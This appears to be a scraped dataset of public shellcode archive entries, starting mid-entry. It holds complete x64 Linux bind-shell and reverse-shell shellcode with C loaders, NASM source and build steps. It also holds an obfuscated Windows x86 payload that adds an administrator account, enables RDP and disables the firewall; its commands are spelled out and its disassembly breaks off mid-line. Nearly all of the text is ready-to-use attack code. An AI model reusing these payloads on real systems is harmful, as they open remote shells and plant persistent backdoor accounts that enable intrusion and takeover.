"\t\"\\x48\\xbf\\x2f\\x2f\\x62\\x69\\x6e\"  /* movabs $0x68732f6e69622f2f,%rdi */", "\t\"\\x2f\\x73\\x68\"                  /* . */", "\t\"\\x57\"                          /* push   %rdi */", "\t\"\\x54\"                          /* push   %rsp */", "\t\"\\x5f\"                          /* pop    %rdi */", "\t\"\\xb0\\x3b\"                      /* mov    $0x3b,%al */", "\t\"\\x0f\\x05\"                      /* syscall */;", "", "main(void)", "{\t", "\tprintf(\"Shellcode length: %d\\n\", (int)strlen(shellcode));", "", "\t/* pollute registers and call shellcode */", "\t__asm__ (\t \"mov $0xffffffffffffffff, %rax\\n\\t\"", "\t\t         \"mov %rax, %rbx\\n\\t\"", "\t\t         \"mov %rax, %rcx\\n\\t\"", "\t\t         \"mov %rax, %rdx\\n\\t\"", "\t\t         \"mov %rax, %rsi\\n\\t\"", "\t\t         \"mov %rax, %rdi\\n\\t\"", "\t\t         \"mov %rax, %rbp\\n\\t\"", "", "\t\t         \"call shellcode\"\t);", "}", "", "/* --------------------------------------------------------------------------------------", "", "; Author:           Sean Dillon", "; Company:          CAaNES, LLC. (http://caanes.com)", "; Release Date:     December 19, 2014", ";", "; Description:      x64 Linux null-free bind TCP port shellcode, optional 4 byte password", "; Assembled Size:   81 bytes, 96 with password", "; Tested On:        Kali 1.0.9a GNU/Linux 3.14.5-kali1-amd64 x86_64", "; License:          http://opensource.org/license/MIT", "; ", "; Build/Run:        nasm -f elf64 -o bindshell.o bindshell.nasm", ";                   ld -o bindshell bindshell.o", ";                   objdump -d --disassembler-options=addr64 bindshell", "", "BITS 64", "global _start", "section .text", "", "; settings", "%define     USEPASSWORD     ; comment this to not require password", "PASSWORD    equ 'Z~r0'      ; cmp dword (SEGFAULT on fail; no bruteforce/cracking/etc.)", "PORT        equ 0x5c11      ; default 4444", "", "; syscall kernel opcodes", "SYS_SOCKET  equ 0x29", "SYS_BIND    equ 0x31", "SYS_LISTEN  equ 0x32", "SYS_ACCEPT  equ 0x2b", "SYS_DUP2    equ 0x21", "SYS_EXECVE  equ 0x3b", "", "; argument constants", "AF_INET     equ 0x2", "SOCK_STREAM equ 0x1", "", "_start:", "; High level psuedo-C overview of shellcode logic:", ";", "; sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP)", "; struct sockaddr = {AF_INET; [PORT; 0x0; 0x0]}", ";", "; bind(sockfd, &sockaddr, 16)", "; listen(sockfd, 0)", "; client = accept(sockfd, &sockaddr, 16)", "; ", "; read(client, *pwbuf, 16)  // 16 > 4 ", "; if (pwbuf != PASSWORD) goto drop", ";", "; dup2(client, STDIN+STDOUT+STDERR)", "; execve(\"/bin/sh\", NULL, NULL)", "", "create_sock:", "    ; sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP)", "    ", "    xor esi, esi            ; 0 out rsi", "    mul esi                 ; 0 out rax, rdx", "    ", "                            ; rdx = IPPROTO_IP (int: 0)", "", "    inc esi                 ; rsi = SOCK_STREAM (int: 1)", "", "    push AF_INET            ; rdi = AF_INET (int: 2)", "    pop rdi", "", "    add al, SYS_SOCKET", "    syscall", "", "    ; store sock", "    push rax", "    pop rdi                 ; rdi = sockfd", "", "struct_sockaddr:    ", "    ; struct sockaddr = {AF_INET; PORT; 0x0; 0x0}", "", "    push rdx                        ; 0 out the stack for struct", "    push rdx", "", "    mov byte [rsp], AF_INET         ; sockaddr.sa_family = AF_INET (u_char)", "    mov word [rsp + 0x2], PORT      ; sockaddr.sa_data[] = PORT (short)", "    push rsp                        ", "    pop rsi                         ; rsi = &sockaddr", "", "bind_port:", "    ; bind(sockfd, const struct sockaddr *addr, 16)", "", "    push rdx                        ; save 0 for rsi in SYS_LISTEN", "", "    push 0x10                       ; rdx = 16 (sizeof sockaddr)", "    pop rdx", "", "    push SYS_BIND", "    pop rax", "    syscall", "", "server_listen:", "    ; listen(sockfd, 0)", "    ", "    pop rsi                 ; backlog = 0 (int)", "    mov al, SYS_LISTEN", "    syscall", "", "client_accept:", "    ; client = accept(sockfd, struct sockaddr *addr, 16)", "", "    mov al, SYS_ACCEPT", "    syscall", "", "    ; store client", "    push rax", "    pop rdi                 ; rdi = client", "", "    ; no need to close parent, save bytes", "", "%ifdef USEPASSWORD", "password_check:", "    ; password = read(client, *buf, 4)", "", "    push rsp", "    pop rsi                         ; rsi = &buf (char*)", "", "                                    ; rdx = 0x10, >4 bytes", "    xor eax, eax                    ; SYS_READ = 0x0", "    syscall", "", "    cmp dword [rsp], PASSWORD       ; simple comparison", "    jne drop                        ; bad pw, abort", "%endif", "", "dupe_sockets:", "    ; dup2(client, STDIN)", "    ; dup2(client, STDOUT)", "    ; dup2(client, STERR)", "    ", "    push 0x3                ; loop down file descriptors for I/O", "    pop rsi", "    ", "dupe_loop:", "    dec esi", "    mov al, SYS_DUP2", "    syscall", "    ", "    jne dupe_loop", "", "exec_shell:", "    ; execve('//bin/sh', NULL, NULL)", "    ", "    push rsi                    ; *argv[] = 0", "    pop rdx                     ; *envp[] = 0", "", "    push rsi                    ; '\\0'", "    mov rdi, '//bin/sh'         ; str", "    push rdi            ", "    push rsp            ", "    pop rdi                     ; rdi = &str (char*)", "", "    mov al, SYS_EXECVE          ; we fork with this syscall", "    syscall", "", "drop:", "    ; password check failed, crash program with BADINSTR/SEGFAULT", "", ";--------------------------------------------------------------------------------------*/"]},
{"Title": "Linux/x64 - Reverse (127.0.0.1:4444/TCP) Shell (/bin/sh) + Password (Z~r0) + Null-Free + Null-Mask Shellcode (77-85/90-98 bytes)", "Author": "Sean Dillon", "Published": ": 2014-12-22", "Platform": "Linux_x86-64", "Download": "https://old.exploit-db.com/download/35587.c", "View": "https://old.exploit-db.com/raw/35587/", "code": ["/*", "* Author:           Sean Dillon", "* Copyright:        (c) 2014 CAaNES, LLC. (http://caanes.com)", "* Release Date:     December 19, 2014", "*", "* Description:      x64 Linux null-free reverse TCP shellcode, optional 4 byte password", "* Assembled Size:   77 - 85 bytes, 90 - 98 with password", "* Tested On:        Kali 1.0.9a GNU/Linux 3.14.5-kali1-amd64 x86_64", "* License:          http://opensource.org/license/MIT", "* ", "* Build/Run:        gcc -m64 -z execstack -fno-stack-protector reverseshell.c -o reverseshell.out", "*                   nc -l -p 4444", "*/", "", "/* ", "* NOTE: This C code connects to 127.0.0.1:4444 and does not have the password option enabled.", "* Because the IP 127.0.0.1 contains null-bytes, a mask has to be used, adding 8 bytes.", "* The end of this file contains the .nasm source code and instructions for building from that.", "*/", "", "#include <stdio.h>", "#include <string.h>", "", "char shellcode[] = ", "\t\"\\x31\\xf6\"                      /* xor    %esi,%esi */", "\t\"\\xf7\\xe6\"                      /* mul    %esi */", "\t\"\\xff\\xc6\"                      /* inc    %esi */", "\t\"\\x6a\\x02\"                      /* pushq  $0x2 */", "\t\"\\x5f\"                          /* pop    %rdi */", "\t\"\\x04\\x29\"                      /* add    $0x29,%al */", "\t\"\\x0f\\x05\"                      /* syscall */", "\t\"\\x50\"                          /* push   %rax */", "\t\"\\x5f\"                          /* pop    %rdi */", "\t\"\\x52\"                          /* push   %rdx */", "\t\"\\x52\"                          /* push   %rdx */", "\t\"\\xc7\\x44\\x24\\x04\\x7d\\xff\\xfe\"  /* movl   $0xfefeff7d,0x4(%rsp) */", "\t\"\\xfe\"                          /* . */", "\t\"\\x81\\x44\\x24\\x04\\x02\\x01\\x01\"  /* addl   $0x2010102,0x4(%rsp) */", "\t\"\\x02\"                          /* . */", "\t\"\\x66\\xc7\\x44\\x24\\x02\\x11\\x5c\"  /* movw   $0x5c11,0x2(%rsp) */", "\t\"\\xc6\\x04\\x24\\x02\"              /* movb   $0x2,(%rsp) */", "\t\"\\x54\"                          /* push   %rsp */", "\t\"\\x5e\"                          /* pop    %rsi */", "\t\"\\x6a\\x10\"                      /* pushq  $0x10 */", "\t\"\\x5a\"                          /* pop    %rdx */", "\t\"\\x6a\\x2a\"                      /* pushq  $0x2a */", "\t\"\\x58\"                          /* pop    %rax */", "\t\"\\x0f\\x05\"                      /* syscall */", "\t\"\\x6a\\x03\"                      /* pushq  $0x3 */", "\t\"\\x5e\"                          /* pop    %rsi */", "\t\"\\xff\\xce\"                      /* dec    %esi */", "\t\"\\xb0\\x21\"                      /* mov    $0x21,%al */", "\t\"\\x0f\\x05\"                      /* syscall */", "\t\"\\x75\\xf8\"                      /* jne    39 <dupe_loop> */", "\t\"\\x56\"                          /* push   %rsi */", "\t\"\\x5a\"                          /* pop    %rdx */", "\t\"\\x56\"                          /* push   %rsi */", "\t\"\\x48\\xbf\\x2f\\x2f\\x62\\x69\\x6e\"  /* movabs $0x68732f6e69622f2f,%rdi */", "\t\"\\x2f\\x73\\x68\"                  /* . */", "\t\"\\x57\"                          /* push   %rdi */", "\t\"\\x54\"                          /* push   %rsp */", "\t\"\\x5f\"                          /* pop    %rdi */", "\t\"\\xb0\\x3b\"                      /* mov    $0x3b,%al */", "\t\"\\x0f\\x05\"                      /* syscall */;", "", "", "main(void)", "{\t", "\tprintf(\"Shellcode length: %d\\n\", (int)strlen(shellcode));", "", "\t/* pollute registers and call shellcode */", "\t__asm__ (\t \"mov $0xffffffffffffffff, %rax\\n\\t\"", "\t\t         \"mov %rax, %rbx\\n\\t\"", "\t\t         \"mov %rax, %rcx\\n\\t\"", "\t\t         \"mov %rax, %rdx\\n\\t\"", "\t\t         \"mov %rax, %rsi\\n\\t\"", "\t\t         \"mov %rax, %rdi\\n\\t\"", "\t\t         \"mov %rax, %rbp\\n\\t\"", "", "\t\t         \"call shellcode\"\t);", "}", "", "", "/* --------------------------------------------------------------------------------------", "", "; Author:           Sean Dillon", "; Company:          CAaNES, LLC. (http://caanes.com)", "; Release Date:     December 19, 2014", ";", "; Description:      x64 Linux null-free reverse TCP shellcode, optional 4 byte password", "; Assembled Size:   77 - 85 bytes, 90 - 98 with password", "; Tested On:        Kali 1.0.9a GNU/Linux 3.14.5-kali1-amd64 x86_64", "; License:          http://opensource.org/license/MIT", "; ", "; Build/Run:        nasm -f elf64 -o reverseshell.o reverseshell.nasm", ";                   ld -o reverseshell reverseshell.o", ";                   objdump -d --disassembler-options=addr64 reverseshell", "", "BITS 64", "global _start", "section .text", "", "; settings", "%define     USEPASSWORD     ; comment this to not require password", "PASSWORD    equ 'Z~r0'      ; cmp dword (SEGFAULT on fail; no bruteforce/cracking/etc.)", "IP          equ 0x0100007f  ; default 127.0.0.1, contains nulls so will need mask", "PORT        equ 0x5c11      ; default 4444", "", "; change the null-free mask as needed", "%define NULLFREE_MASK   0x02010102           ; comment this out if no .0. in IP, save 8 bytes", "", "%ifdef NULLFREE_MASK", "%define NULLFREE_IP     IP - NULLFREE_MASK", "%else", "%define NULLFREE_IP     IP", "%endif", "", "; syscall kernel opcodes", "SYS_SOCKET  equ 0x29", "SYS_CONNECT equ 0x2a", "SYS_DUP2    equ 0x21", "SYS_EXECVE  equ 0x3b", "", "; argument constants", "AF_INET     equ 0x2", "SOCK_STREAM equ 0x1", "", "_start:", "; High level psuedo-C overview of shellcode logic:", ";", "; sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP)", "; IP = NULLFREE_IP + NULLFREE_MASK", "; struct sockaddr = {AF_INET; [PORT; IP; 0x0]}", ";", "; connect(sockfd, &sockaddr, 16)", "; ", "; read(sockfd, *pwbuf, 16)  // 16 > 4 ", "; if (pwbuf != PASSWORD) goto drop", ";", "; dup2(sockfd, STDIN+STDOUT+STDERR)", "; execve(\"/bin/sh\", NULL, NULL)", "", "create_sock:", "    ; sockfd = socket(AF_INET, SOCK_STREAM, 0)", "    ; AF_INET = 2", "    ; SOCK_STREAM = 1", "    ; syscall number 41 ", "", "    xor esi, esi        ; 0 out rsi", "    mul esi             ; 0 out rax, rdx", "", "                        ; rdx = IPPROTO_IP (int: 0)", "", "    inc esi             ; rsi = SOCK_STREAM (int: 1)", "", "    push AF_INET        ; rdi = AF_INET (int: 2)", "    pop rdi", "", "    add al, SYS_SOCKET", "    syscall", "", "    ; copy socket descriptor to rdi for future use ", "", "    push rax", "    pop rdi", "", "struct_sockaddr:  ", "    ; server.sin_family = AF_INET ", "    ; server.sin_port = htons(PORT)", "    ; server.sin_addr.s_addr = inet_addr(\"127.0.0.1\")", "    ; bzero(&server.sin_zero, 8)", "", "    push rdx", "    push rdx", "", "    mov dword [rsp + 0x4], NULLFREE_IP", "", "%ifdef NULLFREE_MASK", "    add dword [rsp + 0x4], NULLFREE_MASK", "%endif", "", "    mov word [rsp + 0x2], PORT", "    mov byte [rsp], AF_INET", "", "connect_sock:", "    ; connect(sockfd, (struct sockaddr *)&server, sockaddr_len)", "", "    push rsp", "    pop rsi", "", "    push 0x10", "    pop rdx", "", "    push SYS_CONNECT", "    pop rax", "    syscall", "", "", "%ifdef USEPASSWORD", "password_check:", "    ; password = read(sockfd, *buf, 4)", "", "                                    ; rsi = &buf (char*)", "                                    ; rdx = 0x10, >4 bytes", "", "    xor eax, eax                    ; SYS_READ = 0x0", "    syscall", "", "    cmp dword [rsp], PASSWORD       ; simple comparison", "    jne drop                        ; bad pw, abort", "%endif", "", "dupe_sockets:", "    ; dup2(sockfd, STDIN)", "    ; dup2(sockfd, STDOUT)", "    ; dup2(sockfd, STERR)", "    ", "    push 0x3                ; loop down file descriptors for I/O", "    pop rsi", "    ", "dupe_loop:", "    dec esi", "    mov al, SYS_DUP2", "    syscall", "    ", "    jne dupe_loop", "", "exec_shell:", "    ; execve('//bin/sh', NULL, NULL)", "    ", "    push rsi                    ; *argv[] = 0", "    pop rdx                     ; *envp[] = 0", "", "    push rsi                    ; '\\0'", "    mov rdi, '//bin/sh'         ; str", "    push rdi            ", "    push rsp            ", "    pop rdi                     ; rdi = &str (char*)", "", "    mov al, SYS_EXECVE          ; we fork with this syscall", "    syscall", "", "drop:", "    ; password check failed, crash program with BADINSTR/SEGFAULT", "", ";--------------------------------------------------------------------------------------*/"]},
{"Title": "Windows/x86 - Add Administrator User (ALI/ALI) + Add To RDP Group + Enable RDP From Registry + Stop Firewall + Auto Start Terminal Service + Obfuscated Shellcode (1218 bytes)", "Author": "Ali Razmjoo", "Published": ": 2015-01-13", "Platform": "Windows_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-897.php", "View": null, "code": ["#Author: Ali Razmjoo", "\u200b\u200b#Title: \u200bObfuscated Shellcode Windows x86 [1218 Bytes] [Add Administrator User/Pass ALI/ALI & Add ALI to RDP Group & Enable RDP From Registery & STOP Firewall & Auto Start terminal service]", "\t", "Obfuscated Shellcode Windows x86 [1218 Bytes].c", "", "/*", "#Title: Obfuscated Shellcode Windows x86 [1218 Bytes] [Add Administrator User/Pass ALI/ALI & Add ALI to RDP Group & Enable RDP From Registery & STOP Firewall & Auto Start terminal service]", "#length: 1218 bytes", "#Date: 13 January 2015", "#Author: Ali Razmjoo", "#tested On: Windows 7 x86 ultimate", "", "WinExec =>  0x7666e695", "ExitProcess =>  0x76632acf", "====================================", "Execute :", "net user ALI ALI /add", "net localgroup Administrators ALI /add", "NET LOCALGROUP \"Remote Desktop Users\" ALI /add  ", "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 1 /f ", "netsh firewall set opmode disable", "sc config termservice start= auto", "====================================", "", "", "", "Ali Razmjoo , ['Ali.Razmjoo1994@Gmail.Com','Ali@Z3r0D4y.Com']", "", "Thanks to my friends , Dariush Nasirpour and Ehsan Nezami", "", "", "C:\\Users\\Ali\\Desktop>objdump -D shellcode.o", "", "shellcode.o:     file format elf32-i386", "", "", "Disassembly of section .text:", "", "00000000 <.text>:", "   0:   31 c0                   xor    %eax,%eax", "   2:   50                      push   %eax", "   3:   b8 41 41 41 64          mov    $0x64414141,%eax", "   8:   c1 e8 08                shr    $0x8,%eax", "   b:   c1 e8 08                shr    $0x8,%eax", "   e:   c1 e8 08                shr    $0x8,%eax", "  11:   50                      push   %eax", "  12:   b9 6d 76 53 52          mov    $0x5253766d,%ecx", "  17:   ba 4d 59 32 36          mov    $0x3632594d,%edx", "  1c:   31 d1                   xor    %edx,%ecx", "  1e:   51                      push   %ecx", "  1f:   b9 6e 72 61 71          mov    $0x7161726e,%ecx", "  24:   ba 4e 33 2d 38          mov    $0x382d334e,%edx", "  29:   31 d1                   xor    %edx,%ecx", "  2b:   51                      push   %ecx", "  2c:   b9 6c 75 78 78          mov    $0x7878756c,%ecx", "  31:   ba 4c 34 34 31          mov    $0x3134344c,%edx", "  36:   31 d1                   xor    %edx,%ecx", "  38:   51                      push   %ecx", "  39:   b9 46 47 57 46          mov    $0x46574746,%ecx", "  3e:   ba 33 34 32 34          mov    $0x34323433,%edx", "  43:   31 d1                   xor    %edx,%ecx", "  45:   51                      push   %ecx", "  46:   b9 56 50 47 64          mov    $0x64475056,%ecx", "  4b:   ba 38 35 33 44          mov    $0x44333538,%edx", "  50:   31 d1                   xor    %edx,%ecx", "  52:   51                      push   %ecx", "  53:   89 e0                   mov    %esp,%eax", "  55:   bb 41 41 41 01          mov    $0x1414141,%ebx", "  5a:   c1 eb 08                shr    $0x8,%ebx", "  5d:   c1 eb 08                shr    $0x8,%ebx", "  60:   c1 eb 08                shr    $0x8,%ebx", "  63:   53                      push   %ebx", "  64:   50                      push   %eax", "  65:   bb a6 b4 02 2f          mov    $0x2f02b4a6,%ebx", "  6a:   ba 33 52 64 59          mov    $0x59645233,%edx", "  6f:   31 d3                   xor    %edx,%ebx", "  71:   ff d3                   call   *%ebx", "  73:   31 c0                   xor    %eax,%eax", "  75:   50                      push   %eax", "  76:   68 41 41 64 64          push   $0x64644141", "  7b:   58                      pop    %eax", "  7c:   c1 e8 08                shr    $0x8,%eax", "  7f:   c1 e8 08                shr    $0x8,%eax", "  82:   50                      push   %eax", "  83:   b9 01 41 60 32          mov    $0x32604101,%ecx", "  88:   ba 48 61 4f 53          mov    $0x534f6148,%edx", "  8d:   31 d1                   xor    %edx,%ecx", "  8f:   51                      push   %ecx", "  90:   b9 28 47 0d 2f          mov    $0x2f0d4728,%ecx", "  95:   ba 5b 67 4c 63          mov    $0x634c675b,%edx", "  9a:   31 d1                   xor    %edx,%ecx", "  9c:   51                      push   %ecx", "  9d:   b9 03 24 36 21          mov    $0x21362403,%ecx", "  a2:   ba 62 50 59 53          mov    $0x53595062,%edx", "  a7:   31 d1                   xor    %edx,%ecx", "  a9:   51                      push   %ecx", "  aa:   b9 34 41 15 18          mov    $0x18154134,%ecx", "  af:   ba 5d 32 61 6a          mov    $0x6a61325d,%edx", "  b4:   31 d1                   xor    %edx,%ecx", "  b6:   51                      push   %ecx", "  b7:   b9 0c 05 1b 25          mov    $0x251b050c,%ecx", "  bc:   ba 68 68 72 4b          mov    $0x4b726868,%edx", "  c1:   31 d1                   xor    %edx,%ecx", "  c3:   51                      push   %ecx", "  c4:   b9 2f 27 7b 13          mov    $0x137b272f,%ecx", "  c9:   ba 5a 57 5b 52          mov    $0x525b575a,%edx", "  ce:   31 d1                   xor    %edx,%ecx", "  d0:   51                      push   %ecx", "  d1:   b9 1c 2c 02 3e          mov    $0x3e022c1c,%ecx", "  d6:   ba 70 4b 70 51          mov    $0x51704b70,%edx", "  db:   31 d1                   xor    %edx,%ecx", "  dd:   51                      push   %ecx", "  de:   b9 3d 2a 32 4c          mov    $0x4c322a3d,%ecx", "  e3:   ba 51 45 51 2d          mov    $0x2d514551,%edx", "  e8:   31 d1                   xor    %edx,%ecx", "  ea:   51                      push   %ecx", "  eb:   b9 23 5c 1c 19          mov    $0x191c5c23,%ecx", "  f0:   ba 4d 39 68 39          mov    $0x3968394d,%edx", "  f5:   31 d1                   xor    %edx,%ecx", "  f7:   51                      push   %ecx", "  f8:   89 e0                   mov    %esp,%eax", "  fa:   bb 41 41 41 01          mov    $0x1414141,%ebx", "  ff:   c1 eb 08                shr    $0x8,%ebx", " 102:   c1 eb 08                shr    $0x8,%ebx", " 105:   c1 eb 08                shr    $0x8,%ebx", " 108:   53                      push   %ebx", " 109:   50                      push   %eax", " 10a:   bb a6 b4 02 2f          mov    $0x2f02b4a6,%ebx", " 10f:   ba 33 52 64 59          mov    $0x59645233,%edx", " 114:   31 d3                   xor    %edx,%ebx", " 116:   ff d3                   call   *%ebx", " 118:   31 c0                   xor    %eax,%eax", " 11a:   50                      push   %eax", " 11b:   68 41 41 64 64          push   $0x64644141", " 120:   58                      pop    %eax", " 121:   c1 e8 08                shr    $0x8,%eax", " 124:   c1 e8 08                shr    $0x8,%eax", " 127:   50                      push   %eax", " 128:   b9 02 63 6b 35          mov    $0x356b6302,%ecx", " 12d:   ba 4b 43 44 54          mov    $0x5444434b,%edx", " 132:   31 d1                   xor    %edx,%ecx", " 134:   51                      push   %ecx", " 135:   b9 61 55 6c 3d          mov    $0x3d6c5561,%ecx", " 13a:   ba 43 75 2d 71          mov    $0x712d7543,%edx", " 13f:   31 d1                   xor    %edx,%ecx", " 141:   51                      push   %ecx", " 142:   b9 27 3f 3b 1a          mov    $0x1a3b3f27,%ecx", " 147:   ba 54 5a 49 69          mov    $0x69495a54,%edx", " 14c:   31 d1                   xor    %edx,%ecx", " 14e:   51                      push   %ecx", " 14f:   b9 25 34 12 67          mov    $0x67123425,%ecx", " 154:   ba 4a 44 32 32          mov    $0x3232444a,%edx", " 159:   31 d1                   xor    %edx,%ecx", " 15b:   51                      push   %ecx", " 15c:   b9 0b 02 1f 19          mov    $0x191f020b,%ecx", " 161:   ba 6e 71 74 6d          mov    $0x6d74716e,%edx", " 166:   31 d1                   xor    %edx,%ecx", " 168:   51                      push   %ecx", " 169:   b9 39 3f 7b 15          mov    $0x157b3f39,%ecx", " 16e:   ba 4d 5a 5b 51          mov    $0x515b5a4d,%edx", " 173:   31 d1                   xor    %edx,%ecx", " 175:   51                      push   %ecx", " 176:   b9 35 15 03 2a          mov    $0x2a031535,%ecx", " 17b:   ba 67 70 6e 45          mov    $0x456e7067,%edx", " 180:   31 d1                   xor    %edx,%ecx", " 182:   51                      push   %ecx", " 183:   b9 3a 17 75 46          mov    $0x4675173a,%ecx", " 188:   ba 6f 47 55 64          mov    $0x6455476f,%edx", " 18d:   31 d1                   xor    %edx,%ecx", " 18f:   51                      push   %ecx", " 190:   b9 26 35 0b 1e          mov    $0x1e0b3526,%ecx", " 195:   ba 6a 72 59 51          mov    $0x5159726a,%edx", " 19a:   31 d1                   xor    %edx,%ecx", " 19c:   51                      push   %ecx", " 19d:   b9 2a 2a 06 2a          mov    $0x2a062a2a,%ecx", " 1a2:   ba 66 65 45 6b          mov    $0x6b456566,%edx", " 1a7:   31 d1                   xor    %edx,%ecx", " 1a9:   51                      push   %ecx", " 1aa:   b9 1d 20 35 5a          mov    $0x5a35201d,%ecx", " 1af:   ba 53 65 61 7a          mov    $0x7a616553,%edx", " 1b4:   31 d1                   xor    %edx,%ecx", " 1b6:   51                      push   %ecx", " 1b7:   89 e0                   mov    %esp,%eax", " 1b9:   bb 41 41 41 01          mov    $0x1414141,%ebx", " 1be:   c1 eb 08                shr    $0x8,%ebx", " 1c1:   c1 eb 08                shr    $0x8,%ebx", " 1c4:   c1 eb 08                shr    $0x8,%ebx", " 1c7:   53                      push   %ebx", " 1c8:   50                      push   %eax", " 1c9:   bb a6 b4 02 2f          mov    $0x2f02b4a6,%ebx", " 1ce:   ba 33 52 64 59          mov    $0x59645233,%edx", " 1d3:   31 d3                   xor    %edx,%ebx", " 1d5:   ff d3                   call   *%ebx", " 1d7:   31 c0                   xor    %eax,%eax", " 1d9:   50                      push   %eax", " 1da:   b9 09 4c 7c 5e          mov    $0x5e7c4c09,%ecx", " 1df:   ba 38 6c 53 38          mov    $0x38536c38,%edx", " 1e4:   31 d1                   xor    %edx,%ecx", " 1e6:   51                      push   %ecx", " 1e7:   b9 42 4d 39 14          mov    $0x14394d42,%ecx", " 1ec:   ba 62 62 5d 34          mov    $0x345d6262,%edx", " 1f1:   31 d1                   xor    %edx,%ecx", " 1f3:   51                      push   %ecx", " 1f4:   b9 7a 24 26 75          mov    $0x7526247a,%ecx", " 1f9:   ba 2d 6b 74 31          mov    $0x31746b2d,%edx", " 1fe:   31 d1                   xor    %edx,%ecx", " 200:   51                      push   %ecx", " 201:   b9 1d 30 15 28          mov    $0x2815301d,%ecx", " 206:   ba 58 77 4a 6c          mov    $0x6c4a7758,%edx", " 20b:   31 d1                   xor    %edx,%ecx", " 20d:   51                      push   %ecx", " 20e:   b9 7c 2f 57 16          mov    $0x16572f7c,%ecx", " 213:   ba 53 5b 77 44          mov    $0x44775b53,%edx", " 218:   31 d1                   xor    %edx,%ecx", " 21a:   51                      push   %ecx", " 21b:   b9 42 25 2a 66          mov    $0x662a2542,%ecx", " 220:   ba 2d 4b 59 46          mov    $0x46594b2d,%edx", " 225:   31 d1                   xor    %edx,%ecx", " 227:   51                      push   %ecx", " 228:   b9 28 2f 0c 5a          mov    $0x5a0c2f28,%ecx", " 22d:   ba 4d 4c 78 33          mov    $0x33784c4d,%edx", " 232:   31 d1                   xor    %edx,%ecx", " 234:   51                      push   %ecx", " 235:   b9 20 2b 26 26          mov    $0x26262b20,%ecx", " 23a:   ba 63 44 48 48          mov    $0x48484463,%edx", " 23f:   31 d1                   xor    %edx,%ecx", " 241:   51                      push   %ecx", " 242:   b9 08 2b 23 67          mov    $0x67232b08,%ecx", " 247:   ba 66 52 77 34          mov    $0x34775266,%edx", " 24c:   31 d1                   xor    %edx,%ecx", " 24e:   51                      push   %ecx", " 24f:   b9 49 1c 2e 48          mov    $0x482e1c49,%ecx", " 254:   ba 69 7a 6a 2d          mov    $0x2d6a7a69,%edx", " 259:   31 d1                   xor    %edx,%ecx", " 25b:   51                      push   %ecx", " 25c:   b9 67 67 1d 37          mov    $0x371d6767,%ecx", " 261:   ba 45 47 32 41          mov    $0x41324745,%edx", " 266:   31 d1                   xor    %edx,%ecx", " 268:   51                      push   %ecx", " 269:   b9 03 33 0d 3b          mov    $0x3b0d3303,%ecx", " 26e:   ba 71 45 68 49          mov    $0x49684571,%edx", " 273:   31 d1                   xor    %edx,%ecx", " 275:   51                      push   %ecx", " 276:   b9 39 6a 3c 2f          mov    $0x2f3c6a39,%ecx", " 27b:   ba 55 4a 6f 4a          mov    $0x4a6f4a55,%edx", " 280:   31 d1                   xor    %edx,%ecx", " 282:   51                      push   %ecx", " 283:   b9 37 44 1f 2e          mov    $0x2e1f4437,%ecx", " 288:   ba 5a 2d 71 4f          mov    $0x4f712d5a,%edx", " 28d:   31 d1                   xor    %edx,%ecx", " 28f:   51                      push   %ecx", " 290:   b9 34 23 23 3b          mov    $0x3b232334,%ecx", " 295:   ba 68 77 46 49          mov    $0x49467768,%edx", " 29a:   31 d1                   xor    %edx,%ecx", " 29c:   51                      push   %ecx", " 29d:   b9 07 3a 0a 14          mov    $0x140a3a07,%ecx", " 2a2:   ba 73 48 65 78          mov    $0x78654873,%edx", " 2a7:   31 d1                   xor    %edx,%ecx", " 2a9:   51                      push   %ecx", " 2aa:   b9 14 2e 58 53          mov    $0x53582e14,%ecx", " 2af:   ba 48 6d 37 3d          mov    $0x3d376d48,%edx", " 2b4:   31 d1                   xor    %edx,%ecx", " 2b6:   51                      push   %ecx", " 2b7:   b9 3e 3d 26 32          mov    $0x32263d3e,%ecx", " 2bc:   ba 52 6e 43 46          mov    $0x46436e52,%edx", " 2c1:   31 d1                   xor    %edx,%ecx", " 2c3:   51                      push   %ecx", " 2c4:   b9 33 3c 35 34          mov    $0x34353c33,%ecx", " 2c9:   ba 5d 48 47 5b          mov    $0x5b47485d,%edx", " 2ce:   31 d1                   xor    %edx,%ecx", " 2d0:   51                      push   %ecx", " 2d1:   b9 36 0e 07 2b          mov    $0x2b070e36,%ecx", " 2d6:   ba 58 7a 44 44          mov    $0x44447a58,%edx", " 2db:   31 d1                   xor    %edx,%ecx", " 2dd:   51                      push   %ecx", " 2de:   b9 3c 10 0a 37          mov    $0x370a103c,%ecx", " 2e3:   ba 49 62 78 52          mov    $0x52786249,%edx", " 2e8:   31 d1                   xor    %edx,%ecx", " 2ea:   51                      push   %ecx", " 2eb:   b9 24 7c 3b 36          mov    $0x363b7c24,%ecx", " 2f0:   ba 61 31 67 75          mov    $0x75673161,%edx", " 2f5:   31 d1                   xor    %edx,%ecx", " 2f7:   51                      push   %ecx", " 2f8:   b9 31 3d 3b 27          mov    $0x273b3d31,%ecx", " 2fd:   ba 62 64 68 73          mov    $0x73686462,%edx", " 302:   31 d1                   xor    %edx,%ecx", " 304:   51                      push   %ecx", " 305:   b9 7f 7d 3d 35          mov    $0x353d7d7f,%ecx", " 30a:   ba 36 33 78 69          mov    $0x69783336,%edx", " 30f:   31 d1                   xor    %edx,%ecx", " 311:   51                      push   %ecx", " 312:   b9 7c 13 0f 2f          mov    $0x2f0f137c,%ecx", " 317:   ba 31 52 4c 67          mov    $0x674c5231,%edx", " 31c:   31 d1                   xor    %edx,%ecx", " 31e:   51                      push   %ecx", " 31f:   b9 1b 08 35 2d          mov    $0x2d35081b,%ecx", " 324:   ba 58 49 79 72          mov    $0x72794958,%edx", " 329:   31 d1                   xor    %edx,%ecx", " 32b:   51                      push   %ecx", " 32c:   b9 74 3a 1e 21          mov    $0x211e3a74,%ecx", " 331:   ba 2d 65 52 6e          mov    $0x6e52652d,%edx", " 336:   31 d1                   xor    %edx,%ecx", " 338:   51                      push   %ecx", " 339:   b9 16 10 1f 17          mov    $0x171f1016,%ecx", " 33e:   ba 34 58 54 52          mov    $0x52545834,%edx", " 343:   31 d1                   xor    %edx,%ecx", " 345:   51                      push   %ecx", " 346:   b9 2f 27 0c 6e          mov    $0x6e0c272f,%ecx", " 34b:   ba 4e 43 68 4e          mov    $0x4e68434e,%edx", " 350:   31 d1                   xor    